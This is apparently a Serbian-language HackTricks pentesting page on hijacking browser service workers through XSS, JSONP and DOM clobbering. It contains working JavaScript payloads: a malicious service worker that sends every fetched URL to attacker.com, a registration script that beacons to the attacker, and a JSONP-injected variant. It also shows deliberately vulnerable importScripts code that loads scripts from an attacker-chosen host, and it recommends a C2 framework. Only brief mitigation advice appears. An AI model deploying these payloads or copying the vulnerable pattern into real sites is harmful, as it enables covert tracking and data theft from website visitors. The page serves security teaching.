# Abusing Service Workers

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

**Service worker** je skripta koju vaš pregledač pokreće u pozadini, odvojeno od bilo koje web stranice, omogućavajući funkcije koje ne zahtevaju web stranicu ili interakciju korisnika, čime se poboljšavaju **offline i pozadinske obrade**. Detaljne informacije o service workers mogu se naći [ovde](https://developers.google.com/web/fundamentals/primers/service-workers). Iskorišćavanjem service workers unutar ranjivog web domena, napadači mogu preuzeti kontrolu nad interakcijama žrtve sa svim stranicama unutar tog domena.

### Checking for Existing Service Workers

Postojeći service workers mogu se proveriti u sekciji **Service Workers** na **Application** tabu u **Developer Tools**. Druga metoda je poseta [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) za detaljniji pregled.

### Push Notifications

**Dozvole za push obaveštenja** direktno utiču na sposobnost **service worker-a** da komunicira sa serverom bez direktne interakcije korisnika. Ako su dozvole odbijene, to ograničava potencijal service worker-a da predstavlja kontinuiranu pretnju. S druge strane, davanje dozvola povećava sigurnosne rizike omogućavanjem prijema i izvršavanja potencijalnih eksploatacija.

## Attack Creating a Service Worker

Da biste iskoristili ovu ranjivost, potrebno je da pronađete:

- Način da **otpremite proizvoljne JS** datoteke na server i **XSS da učitate service worker** otpremljene JS datoteke
- **Ranjivi JSONP zahtev** gde možete **manipulisati izlazom (sa proizvoljnim JS kodom)** i **XSS** da **učitate JSONP sa payload-om** koji će **učitati zlonameran service worker**.

U sledećem primeru ću predstaviti kod za **registraciju novog service worker-a** koji će slušati `fetch` događaj i **slati napadačevom serveru svaku preuzetu URL adresu** (ovo je kod koji bi trebalo da **otpremite** na **server** ili učitate putem **ranjivog JSONP** odgovora):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
I ovo je kod koji će **registrovati radnika** (kod koji biste trebali moći da izvršite zloupotrebom **XSS**). U ovom slučaju, **GET** zahtev će biti poslat na server **napadača** **obaveštavajući** da li je **registracija** servisnog radnika bila uspešna ili ne:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
U slučaju zloupotrebe ranjivog JSONP krajnje tačke, trebali biste staviti vrednost unutar `var sw`. Na primer:
```javascript
var sw =
"/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//"
```
Postoji **C2** posvećen **iskorišćavanju Service Workers** pod nazivom [**Shadow Workers**](https://shadow-workers.github.io) koji će biti veoma koristan za zloupotrebu ovih ranjivosti.

**Direktiva keširanja od 24 sata** ograničava životni vek zlonamernog ili kompromitovanog **service worker-a (SW)** na najviše 24 sata nakon ispravke XSS ranjivosti, pod pretpostavkom online statusa klijenta. Da bi se minimizirala ranjivost, operateri sajtova mogu smanjiti TTL (Time-To-Live) SW skripte. Takođe, programerima se savetuje da kreiraju [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) za brzu deaktivaciju.

## Zloupotreba `importScripts` u SW putem DOM Clobbering-a

Funkcija **`importScripts`** pozvana iz Service Worker-a može **importovati skriptu iz druge domene**. Ako se ova funkcija pozove koristeći **parametar koji bi napadač mogao** da izmeni, on bi mogao da **importuje JS skriptu iz svoje domene** i dobije XSS.

**Ovo čak zaobilazi CSP zaštite.**

**Primer ranjivog koda:**

- **index.html**
```html
<script>
navigator.serviceWorker.register(
"/dom-invader/testcases/augmented-dom-import-scripts/sw.js" +
location.search
)
// attacker controls location.search
</script>
```
- **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search)
let host = searchParams.get("host")
self.importScripts(host + "/sw_extra.js")
//host can be controllable by an attacker
```
### Sa DOM Clobbering

Za više informacija o tome šta je DOM Clobbering proverite:

{{#ref}}
dom-clobbering.md
{{#endref}}

Ako je URL/domen koji SW koristi za pozivanje **`importScripts`** **unutar HTML elementa**, **moguće je modifikovati ga putem DOM Clobbering** da bi SW **učitao skriptu sa vašeg domena**.

Za primer ovog proverite referentnu vezu.

## Reference

- [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{{#include ../../banners/hacktricks-training.md}}
